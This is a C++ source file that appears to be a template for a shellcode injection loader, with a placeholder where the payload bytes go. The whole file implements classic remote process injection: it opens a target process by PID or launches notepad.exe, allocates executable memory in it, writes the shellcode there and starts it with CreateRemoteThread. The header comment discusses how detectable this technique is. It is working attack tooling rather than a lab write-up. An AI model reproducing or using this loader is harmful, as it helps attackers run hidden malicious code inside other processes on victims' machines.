/**
Author: Thomas X Meng
Classic userland API, most detected by API Successions
***/
#include <windows.h>
#include <cstdio>

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

unsigned char magiccode[] = ####SHELLCODE####;

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {
    HANDLE hThread = NULL;
    PVOID lpAllocationStart = NULL;
    DWORD oldProtect = 0;

    // Corrected usage of magiccodeSize instead of sizeof magiccode
    lpAllocationStart = VirtualAllocEx(hProcess, NULL, magiccodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (lpAllocationStart == NULL) {
        printf("[-] VirtualAllocEx failed (%d).\n", GetLastError());
        return;
    }

    // Correctly writing the magiccode using magiccodeSize
    if (!WriteProcessMemory(hProcess, lpAllocationStart, magiccode, magiccodeSize, NULL)) {
        printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
        return;
    }
    //print the memeory address of the shellcode in human readable format
    printf("[+] Shellcode is located at: %p\n", lpAllocationStart);
    
    // Creating a thread in the target process to execute the magiccode
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, 0, NULL);


    // Wait for the magiccode to execute
    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }

}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

int main(int argc, char *argv[])
{

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    //check if pid is provided as argument: 
    if (argc > 1) {
        pid = atoi(argv[1]);
        printf("[+] PID provided: %d\n", pid);
        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        printf("[-] PID not provided\n");
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        // Attempt to create a process with Notepad
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start Notepad
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;  
        printf("[+] notepad PID: %d\n", pid);      
    }


    SIZE_T magiccodeSize = sizeof(magiccode);

	printf("[+] Classic execution starts, all userland calls\n");
    Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

	return 0;
}